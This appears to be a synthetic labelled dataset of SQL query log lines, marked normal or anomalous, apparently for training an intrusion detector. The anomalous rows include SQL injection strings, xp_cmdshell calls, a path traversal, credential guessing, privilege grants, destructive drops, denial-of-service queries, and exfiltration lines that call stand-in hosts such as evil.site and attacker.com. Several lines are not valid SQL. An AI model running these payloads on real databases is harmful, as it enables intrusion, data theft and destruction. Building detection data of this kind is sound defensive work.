+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER TABLE budgets DROP COLUMN limit_check,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT SUM(profit) FROM sales WHERE date = 'future_date',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE refunds SET status = 'approved' FOR ALL,anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO loans (principal, interest) VALUES (0, 100000)",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM cart WHERE user_id = 0 -- guest admin,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE orders SET status = 'shipped' WHERE payment_status = 'unpaid',anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO access_logs (user, action) VALUES ('anonymous', 'delete_all')",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM premium_content WHERE subscription = 'none' OR 1=1,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM rate_limits WHERE ip = 'attacker_ip',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE profiles SET verified = TRUE WHERE email = 'fake@domain',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM api_endpoints WHERE auth_required = FALSE UNION SELECT * FROM internal,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO sessions (user_id) VALUES (-1) -- superuser,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER VIEW public_data AS SELECT * FROM private_data,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT discount FROM promotions WHERE code = '' OR code = 'invalid',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users WHERE id = 42,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO products (name, price) VALUES ('Laptop', 999.99)",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE accounts SET last_login = CURRENT_TIMESTAMP WHERE user_id = 5,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM temp_files WHERE created_at < '2025-01-01',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(*) FROM orders WHERE status = 'pending',normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO logs (event, time) VALUES ('login', NOW())",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT name FROM employees WHERE department = 'Sales',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE inventory SET stock = stock - 1 WHERE product_id = 100,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM expired_sessions WHERE expiry < CURRENT_DATE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT SUM(amount) FROM transactions WHERE date = '2026-01-05',normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO customers (name, email) VALUES ('John Doe', 'john@example.com')",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM configs WHERE key = 'app_version',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE profiles SET bio = 'Updated bio' WHERE user_id = 10,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM old_backups WHERE backup_date < '2024-01-01',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT AVG(rating) FROM reviews GROUP BY product_id,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO categories (name) VALUES ('Electronics'),normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM suppliers JOIN products ON suppliers.id = products.supplier_id,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE orders SET status = 'shipped' WHERE id = 200,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM cart_items WHERE user_id = 15 AND added < NOW() - INTERVAL '1 DAY',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT MAX(salary) FROM employees,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO payments (order_id, amount) VALUES (200, 49.99)",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM logs WHERE time > '2026-01-01' ORDER BY time DESC LIMIT 10,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE users SET email_verified = TRUE WHERE id = 42,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM notifications WHERE read = TRUE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT DISTINCT category FROM products,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO audits (action, user) VALUES ('update', 'admin')",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM finances WHERE quarter = 4 AND year = 2025,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE expenses SET approved = TRUE WHERE id = 300,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM archived_emails WHERE sent < '2023-01-01',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(DISTINCT user_id) FROM sessions,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT id, name FROM teams WHERE active = TRUE",normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO events (title, date) VALUES ('Meeting', '2026-02-01')",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE projects SET status = 'completed' WHERE end_date < CURRENT_DATE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM tasks WHERE priority = 'low' AND due < NOW(),normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM documents WHERE owner_id = 7 ORDER BY created_at,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO comments (post_id, text) VALUES (50, 'Great article!')",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT AVG(duration) FROM calls GROUP BY agent_id,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE contacts SET phone = '123-456-7890' WHERE id = 80,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM subscriptions WHERE expired = TRUE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM inventory WHERE stock > 0 LIMIT 20,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO reports (type, generated) VALUES ('monthly', NOW())",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT SUM(revenue) FROM sales WHERE month = 1,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE vendors SET rating = 4.5 WHERE id = 90,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM temp_data WHERE processed = TRUE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users JOIN roles ON users.role_id = roles.id,normaly,1
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO feedback (score, comment) VALUES (5, 'Excellent service')",normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT MIN(price) FROM products WHERE category = 'Books',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE logs SET archived = TRUE WHERE time < '2025-12-01',normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM drafts WHERE user_id = 25,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(*) FROM visits WHERE date = CURRENT_DATE,normaly,1
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users WHERE username = 'admin' OR '1'='1' --,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT id FROM products WHERE name = '' UNION SELECT password FROM admins --,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE accounts SET balance = 1000 WHERE id = 5; DROP TABLE logs; --,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM orders WHERE order_id = '1' AND 1=0 UNION ALL SELECT credit_card FROM payments,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO comments (text) VALUES ('test') OR 1=1; EXEC xp_cmdshell('net user'),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT name FROM employees WHERE dept = 'HR' AND ''='' UNION SELECT schema_name FROM information_schema.schemata,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM temp WHERE id = -1 OR 'a'='a',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM files WHERE path = '../../etc/passwd' --,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE profiles SET email = 'hacked@example.com' WHERE user_id = 42 AND 1=2 UNION SELECT * FROM sys.tables,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(*) FROM inventory WHERE stock > 0 OR SLEEP(5)=0,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users WHERE username = 'admin' AND password = 'password123',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT id FROM auth WHERE email = 'user@domain.com' AND pass = MD5('qwerty'),anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO login_attempts (user, pass) VALUES ('root', 'admin')",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM credentials WHERE login = 'guest' AND hash = SHA1('letmein'),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE sessions SET token = 'invalid' WHERE user = 'sysadmin' AND pw = '123456',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(*) FROM accounts WHERE uname = 'manager' AND pwd = 'manager' OR 'x'='x',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM failed_logins WHERE ip = '192.168.1.1' AND attempt = 'passw0rd',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM api_keys WHERE key = 'APIKEY' AND secret = 'secretkey' UNION SELECT * FROM secrets,anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO users (name, pass) VALUES ('test', 'test123') -- brute force simulation",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT role FROM roles WHERE user_id = 1 AND password = 'adminadmin',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=GRANT ALL PRIVILEGES ON . TO 'hacker'@'%' IDENTIFIED BY 'pass',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT credit_card_number FROM transactions ORDER BY date DESC LIMIT 1000,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM medical_records WHERE patient_id = ANY (SELECT id FROM patients),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT password_hash FROM users UNION SELECT api_key FROM configs,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DUMP TABLE personal_info TO '/var/www/dump.txt',anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT email, phone FROM customer_data WHERE last_login < '2025-01-01'",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM confidential_docs WHERE access_level = 'restricted',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT encryption_key FROM security_vault,anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT address, dob FROM profiles EXPORT TO CSV",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM audit_logs WHERE event = 'login' AND user = 'vip',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM database INTO OUTFILE '/tmp/all_data.csv',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DECLARE @data XML; SET @data = (SELECT * FROM secrets FOR XML AUTO); SELECT @data,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=COPY (SELECT * FROM finances) TO '/export/finances.dump',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM logs BULK INSERT INTO external_server,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=EXPORT TABLE users TO 's3://bucket/leaked_users.json',anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT CONCAT_WS(',', * ) FROM customer_info INTO OUTFILE '/var/export.csv'",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DUMP SCHEMA public TO 'ftp://attacker.com/schema.sql',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM orders FOR JSON PATH INTO '/json/export.json',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=COPY products TO PROGRAM 'curl -F file=@- http://evil.site/upload',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM backups EXPORT SET TO 'http://exfil.domain/data',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE balances SET amount = 0 WHERE account_type = 'savings',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM transactions WHERE date > '2024-01-01',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER TABLE logs DROP COLUMN evidence,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO votes (candidate) VALUES ('fraud') REPEAT 1000,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE inventory SET quantity = -999 WHERE product_id > 0,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=TRUNCATE TABLE audit_trail,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE user_roles SET role = 'admin' WHERE role = 'user',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DELETE FROM backups WHERE backup_date < CURRENT_DATE,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER COLUMN passwords TYPE TEXT USING 'corrupted',anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO financials (amount) VALUES (999999999) -- overflow,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM large_table CROSS JOIN large_table,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=WHILE 1=1 SELECT SLEEP(10),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DECLARE @i INT = 1; WHILE @i < 1000000 SET @i = @i + 1; SELECT @i,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users WHERE id IN (SELECT id FROM users) RECURSIVE,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=INSERT INTO temp_table SELECT * FROM huge_log REPEAT 100,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(*) FROM cartesian_product_view,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=UPDATE stats SET value = value + 1 FOR ALL ROWS,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM files WHERE content LIKE '%a%' OR CONTENT LIKE '%b%' ... (repeated patterns),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=DECLARE CURSOR c FOR SELECT * FROM infinite_loop_view; FETCH ALL FROM c,anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT BENCHMARK(100000000, MD5('test'))",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM orders WHERE date BETWEEN '1900-01-01' AND '2100-12-31' WITHOUT INDEX,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT DISTINCT * FROM logs ORDER BY timestamp DESC LIMIT 1 OFFSET 999999,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM products JOIN suppliers ON 1=1,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT SUM(amount) FROM transactions GROUP BY millisecond(timestamp),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM users WHERE username REGEXP '.*',anormaly,0
+"timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM data WHERE JSON_EXTRACT(details, '$.*') IS NOT NULL",anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM archive WHERE year = 2025 OR year = 2024 OR ... (long OR chain),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT COUNT(DISTINCT id) FROM massive_dataset WITHOUT PARTITION,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM views WHERE complex_calc > 0 AND complex_calc < 1,anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=SELECT * FROM table1 UNION SELECT * FROM table2 UNION ... (many unions),anormaly,0
+timestamp=2025-01-01 00:00:00 user=webapp ip=0.0.0.0 duration=0.01 sql=ALTER TABLE configs DROP CONSTRAINT primary_key,anormaly,0
